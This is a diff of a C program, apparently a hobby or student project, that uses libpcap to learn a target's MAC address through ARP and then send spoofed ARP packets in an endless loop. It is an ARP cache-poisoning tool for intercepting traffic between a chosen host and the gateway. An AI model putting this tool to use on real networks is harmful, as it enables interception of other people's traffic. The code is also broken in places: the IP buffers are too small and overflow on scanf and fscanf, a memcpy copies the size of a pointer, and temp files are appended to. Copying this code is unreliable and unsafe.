@@ -17,7 +17,7 @@ enum arp__{
 
 unsigned int protoc_[] = {0x0800, 0x0000, 0x06}; //not right
 
-char * protoc_c[] = {"ipv4", "ipv6", "tcp"};
+const char * protoc_c[] = {"ipv4", "ipv6", "tcp"};
 
 unsigned int offset = 0;
 
@@ -135,6 +135,44 @@ void tcp_print(struct tcp_header * th)
 
 
 
+int arp_reply_extract(const u_char * packet, char* DIP, struct ether_addr * dmac)
+{
+    //const u_char * packet = packet_;
+    //packet = (u_char *)malloc(43*sizeof(u_char));
+    //memcpy(packet, packet_, 42);
+
+    struct sockaddr_in sa;
+
+    //if not arp drop
+    if(ntohs(*  ((unsigned short *)(packet+12))  ) != 0x0806)
+    {
+        printf("protocol : %2x\n", ntohs(*(unsigned short *)(packet+12)));
+        return 0;
+    }
+    //if not reply drop
+    if(ntohs(*(unsigned short *)(packet+20)) != 0x0002)
+    {
+        printf("reply? : %2x\n", ntohs(*(unsigned short *)(packet+20)));
+        return 0;
+    }
+    //if not right ip drop
+    /*
+    if(*(unsigned int *)(packet+28) != *(unsigned int *)DIP)
+        return 0;
+    */
+    inet_pton(AF_INET, DIP, &(sa.sin_addr));
+    if((*(unsigned int *)(packet+28)) != (*(unsigned int *)(&(sa.sin_addr))) )
+    {
+        printf("recieved ip : %x\n", (*(unsigned int *)(packet+28)));
+        printf("target ip : %x\n", (*(unsigned int *)(&(sa.sin_addr))));
+        return 0;
+    }
+
+    memcpy(dmac, packet+22, sizeof(dmac));
+    //dmac = (struct ether_addr *)(packet + 22);
+    return 1;
+}
+
 
 
 void arp_r_base_setting(u_char * packet, arp__ rr)
@@ -184,14 +222,13 @@ void arp_request_setting(u_char *packet, char * DIP, char *SMAC, char *SIP)
     int i;
 
     //get SMAC
-    system("ifconfig | grep \"HWaddr\" | awk -F \" \" '{print $5}' | head -n 1 > SMAC.txt");
-    system("cat SMAC.txt");
+    system("ifconfig | grep \"HWaddr\" | awk -F \" \" '{print $5}' | head -n 1 >> SMAC.txt");
     fp = fopen("SMAC.txt", "r");
     fscanf(fp, "%s", SMAC);
     fclose(fp);
 
     //get SIP
-    system("ifconfig | grep \"inet addr\" | head -n 1 | awk -F\" \" '{print $2}' | awk -F \":\" '{print $2}' > SIP.txt");
+    system("ifconfig | grep \"inet addr\" | head -n 1 | awk -F\" \" '{print $2}' | awk -F \":\" '{print $2}' >> SIP.txt");
     fp = fopen("SIP.txt", "r");
     fscanf(fp, "%s", SIP);
     fclose(fp);
@@ -224,22 +261,6 @@ void arp_request_setting(u_char *packet, char * DIP, char *SMAC, char *SIP)
     printf("\n\n");
 }
 
-
-int arp_reply_extract(const u_char * packet, char* DIP, struct ether_addr * dmac)
-{
-    //if not arp drop
-    if(ntohs(*(unsigned short *)(packet+12)) != 0x0806)
-        return 0;
-    //if not reply drop
-    if(ntohs(*(unsigned short *)(packet+20)) != 0x0002)
-        return 0;
-    //if not right ip drop
-    if(*(unsigned int *)(packet+28) != *(unsigned int *)DIP)
-        return 0;
-
-    dmac = (struct ether_addr *)(packet + 22);
-    return 1;
-}
 
 //not yet
 void arp_spoof(u_char * packet, char * DIP, struct ether_addr dmac, char *SMAC, char *GIP)
@@ -282,7 +303,7 @@ void arp_spoof(u_char * packet, char * DIP, struct ether_addr dmac, char *SMAC, 
 void get_gip(char * GIP)
 {
     FILE *fp;
-    system("route -n | grep UG | awk -F \" \" '{print $2}' >> GIP.txt");
+    system("route -n | grep UG | awk -F \" \" '{print $2}' > GIP.txt");
     fp = fopen("GIP.txt", "r");
     fscanf(fp, "%s", GIP);
     printf("GIP : %s\n", GIP);
@@ -291,19 +312,27 @@ void get_gip(char * GIP)
 
 int main() //int main(int argc, char *argv[])
 {
-    pcap_t *arp_r;
-    u_char arp_request_packet[100] = {0, };
-    u_char arp_reply_packet[100] = {0, };
-    u_char arp_spoof_packet[100] = {0, };
+    //pcap_t *arp_r;
+    //u_char arp_request_packet[50] = {0, };
+    //u_char arp_reply_packet[50] = {0, };
+    //u_char arp_spoof_packet[50] = {0, };
+    u_char * arp_request_packet;
+    u_char * arp_reply_packet;
+    u_char * arp_spoof_packet;
+
+    arp_request_packet = (u_char *)calloc(50, sizeof(u_char));
+    arp_reply_packet = (u_char *)calloc(50, sizeof(u_char));
+    arp_spoof_packet = (u_char *)calloc(50, sizeof(u_char));
 
 
     char DIP[7];
-    struct ether_addr dmac;
+    struct ether_addr *dmac;
+    dmac = (ether_addr*)malloc(sizeof(ether_addr));
 
-    char SMAC[100];
-    char SIP[100];
+    char SMAC[7];
+    char SIP[5];
     //gateway ip
-    char GIP[100];
+    char GIP[5];
 
 
    //printf("started\n\n");
@@ -335,11 +364,10 @@ int main() //int main(int argc, char *argv[])
 
    printf("enter DIP\n");
    scanf("%s", DIP);
+   //fflush(stdin);
 
    //arp request packet
    arp_request_setting(arp_request_packet, DIP, SMAC, SIP);
-
-
 
    // find all network adapters
        if (pcap_findalldevs(&alldevs, errbuf) == -1) {
@@ -369,14 +397,7 @@ int main() //int main(int argc, char *argv[])
 
 
    /* Define the device */
-   /*
 
-   dev = pcap_lookupdev(errbuf);
-   if (dev == NULL) {
-       fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
-       return(2);
-   }
-   */
    dev = d->name;
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
@@ -392,33 +413,37 @@ int main() //int main(int argc, char *argv[])
    }
 
 
-   //arp reply -> extract dmac
 
-   printf("before extractingwtf\n");
+   //arp reply -> extract dmac
 
    //send arp request and get reply => get dmac
    got_reply = 0;
-   while(!got_reply)
+   printf("now ask damc\n");
+
+   while(1)
    {
-       printf("just befor sending");
+       sleep(1);
        pcap_sendpacket(handle, arp_request_packet, 42);
-       printf("sent arp_reqeust");
-       for(i = 0; i<INT16_MAX; i++)
+       printf("sent arp_reqeust\n");
+
+       packet = pcap_next(handle, &header);
+       if(packet==NULL)
+           continue;
+
+       if(arp_reply_extract(packet, DIP, dmac))
        {
-           packet = pcap_next(handle, &header);
-           if(arp_reply_extract(packet, DIP, &dmac))
-           {
-               got_reply = 1;
-               break;
-           }
+           got_reply = 1;
+           printf("got dmac\n");
+           break;
        }
+
 
    }
 
-   printf("where are you");
+   printf("now start spoof\n");
 
    //make spoofing packet
-   arp_spoof(arp_spoof_packet, DIP, dmac, SMAC, GIP);
+   arp_spoof(arp_spoof_packet, DIP, *dmac, SMAC, GIP);
 
    //spoofing
    while(1)
@@ -430,4 +455,5 @@ int main() //int main(int argc, char *argv[])
 
    pcap_close(handle);
    return(0);
+
 }
